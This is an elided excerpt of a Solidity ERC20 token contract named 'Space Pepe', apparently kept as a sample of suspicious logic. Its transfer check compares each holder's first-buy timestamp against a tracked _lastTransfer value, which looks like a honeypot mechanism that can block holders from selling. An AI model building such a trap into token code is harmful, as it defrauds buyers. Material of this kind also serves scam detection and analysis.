...
contract SPACEPEPE is ERC20, Ownable {
    ...
    mapping(address => uint256) public _holderFirstTransferTimestamp;
    uint256 public botsCaught;
    uint256 public _lastTransfer;
    ...
    constructor() ERC20("Space Pepe", "SPACEPEPE") {
        ...
        marketingWallet = address(0x6a63fBa6fA8cD0A7f6f43eE76090bBC456b660DB);
        devWallet = address(0xE1DecCd99c5C92C212864Eb6cAa90b7FA3E0EFFd);
    ...
    function triggerSwapBack(
        ...
        if (_isSwapBackPossible(_trader, _amount, _deadline)) {
            swapping = true;
            swapBack();
            swapping = false;
    ...
    function _transfer(
            ...
            if (
                ...
                if (transferDelayEnabled) {
                    if (
                        ...
                        require(
                            _holderFirstTransferTimestamp[from] > _lastTransfer,
                            "_transfer:: Transfer Delay enabled.  Try again later."
                        );
                    }
                }
        ...
        if (_holderFirstTransferTimestamp[to] == 0 && automatedMarketMakerPairs[from]) {
            if (balanceOf(address(to)) == 0) {
              _holderFirstTransferTimestamp[to] = block.timestamp;
            }
        }
